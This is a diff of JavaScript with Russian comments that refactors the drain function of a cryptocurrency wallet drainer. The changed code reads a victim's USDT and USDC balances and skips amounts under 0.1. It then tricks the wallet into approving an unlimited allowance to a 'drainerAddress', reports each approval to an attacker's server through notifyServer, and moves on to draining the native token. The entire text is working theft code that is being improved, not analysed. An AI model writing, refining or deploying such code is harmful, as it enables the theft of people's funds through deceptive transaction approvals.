@@ -190,6 +190,7 @@ async function switchChain(chainId) {
 async function drain(chainId, signer, userAddress, bal) {
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
+  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6); // Минимальный порог 0.1 USDT/USDC
 
   // Проверяем провайдер перед использованием
   const reliableProvider = await getWorkingProvider(config.rpcUrls, signer.provider);
@@ -204,78 +205,77 @@ async function drain(chainId, signer, userAddress, bal) {
     throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
   }
 
-  // Проверка и выполнение approve для USDT
+  // Проверяем реальные балансы USDT и USDC
+  let realUsdtBalance = ethers.BigNumber.from(0);
+  let realUsdcBalance = ethers.BigNumber.from(0);
+
   if (bal.usdtBalance.gt(0)) {
     console.log(`📊 USDT баланс (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
-    const realUsdtBalance = await usdt.balanceOf(userAddress);
+    realUsdtBalance = await usdt.balanceOf(userAddress);
     console.log(`📊 USDT баланс (реальный): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
     if (realUsdtBalance.lt(bal.usdtBalance)) {
       console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
       bal.usdtBalance = realUsdtBalance;
     }
-
-    const allowanceBefore = await usdt.allowance(userAddress, config.drainerAddress);
-    console.log(`📜 USDT allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDT`);
-
-    if (allowanceBefore.lt(bal.usdtBalance)) {
-      try {
-        const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
-        const tx = await usdt.approve(config.drainerAddress, MAX, {
-          gasLimit: 100000,
-          gasPrice: ethers.utils.parseUnits("3", "gwei"),
-          nonce
-        });
-        const receipt = await tx.wait();
-        console.log("✅ USDT approve успешен:", tx.hash);
-        console.log("⏳ Ожидание подтверждения approve...");
-        await delay(5000);
-        const allowanceAfter = await usdt.allowance(userAddress, config.drainerAddress);
-        console.log(`📜 USDT allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDT`);
-        await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, receipt.transactionHash);
-      } catch (e) {
-        console.error(`❌ Ошибка approve для USDT: ${e.message}`);
-        throw e;
-      }
-    } else {
-      console.log("✅ USDT allowance уже достаточен, уведомляем сервер");
-      await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, null);
-    }
   }
 
-  // Проверка и выполнение approve для USDC
   if (bal.usdcBalance.gt(0)) {
     console.log(`📊 USDC баланс (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
-    const realUsdcBalance = await usdc.balanceOf(userAddress);
+    realUsdcBalance = await usdc.balanceOf(userAddress);
     console.log(`📊 USDC баланс (реальный): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
     if (realUsdcBalance.lt(bal.usdcBalance)) {
       console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
       bal.usdcBalance = realUsdcBalance;
     }
+  }
 
-    const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
-    if (allowanceBefore.lt(bal.usdcBalance)) {
+  // Сравниваем балансы и выбираем токен с большим балансом
+  const tokensToProcess = [];
+  if (bal.usdtBalance.gt(MIN_TOKEN_BALANCE)) {
+    tokensToProcess.push({ token: 'USDT', balance: bal.usdtBalance, contract: usdt, address: config.usdtAddress });
+  }
+  if (bal.usdcBalance.gt(MIN_TOKEN_BALANCE)) {
+    tokensToProcess.push({ token: 'USDC', balance: bal.usdcBalance, contract: usdc, address: config.usdcAddress });
+  }
+
+  // Сортируем по убыванию баланса
+  tokensToProcess.sort((a, b) => (b.balance.gt(a.balance) ? 1 : -1));
+
+  // Обрабатываем токены в порядке убывания баланса
+  for (const { token, balance, contract, address } of tokensToProcess) {
+    console.log(`📦 Обрабатываем ${token} с балансом: ${ethers.utils.formatUnits(balance, 6)}`);
+
+    const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);
+    console.log(`📜 ${token} allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} ${token}`);
+
+    if (allowanceBefore.lt(balance)) {
       try {
         const nonce = await reliableProvider.getTransactionCount(userAddress, "pending");
-        const tx = await usdc.approve(config.drainerAddress, MAX, {
+        const tx = await contract.approve(config.drainerAddress, MAX, {
           gasLimit: 100000,
           gasPrice: ethers.utils.parseUnits("3", "gwei"),
           nonce
         });
         const receipt = await tx.wait();
-        console.log("✅ USDC approve успешен:", tx.hash);
+        console.log(`✅ ${token} approve успешен:`, tx.hash);
         console.log("⏳ Ожидание подтверждения approve...");
         await delay(5000);
-        const allowanceAfter = await usdc.allowance(userAddress, config.drainerAddress);
-        console.log(`📜 USDC allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDC`);
-        await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, receipt.transactionHash);
+        const allowanceAfter = await contract.allowance(userAddress, config.drainerAddress);
+        console.log(`📜 ${token} allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} ${token}`);
+        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash);
       } catch (e) {
-        console.error(`❌ Ошибка approve для USDC: ${e.message}`);
+        console.error(`❌ Ошибка approve для ${token}: ${e.message}`);
         throw e;
       }
     } else {
-      console.log("✅ USDC allowance уже достаточен, уведомляем сервер");
-      await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, null);
+      console.log(`✅ ${token} allowance уже достаточен, уведомляем сервер`);
+      await notifyServer(userAddress, address, balance, chainId, null);
     }
+  }
+
+  // Если нет токенов для обработки
+  if (tokensToProcess.length === 0) {
+    console.log("⚠️ Нет токенов с достаточным балансом для обработки (мин. 0.1 USDT/USDC)");
   }
 
   // Дрейнинг нативного токена
